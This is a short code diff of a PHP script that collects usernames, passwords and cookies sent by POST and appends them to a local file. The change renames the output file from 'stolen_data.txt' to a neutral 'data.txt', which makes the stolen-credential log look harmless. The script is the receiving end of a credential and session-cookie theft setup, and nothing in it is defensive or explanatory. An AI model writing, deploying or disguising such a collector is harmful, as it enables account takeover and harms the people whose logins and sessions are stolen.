@@ -3,7 +3,7 @@ $username = $_POST['username'];
 $password = $_POST['password'];
 $cookie = $_POST['cookie'];
 
-$file = fopen("stolen_data.txt", "a");
+$file = fopen("data.txt", "a");
 fwrite($file, "Username: " . $username . "\n");
 fwrite($file, "Password: " . $password . "\n");
 fwrite($file, "Cookie: " . $cookie . "\n\n");
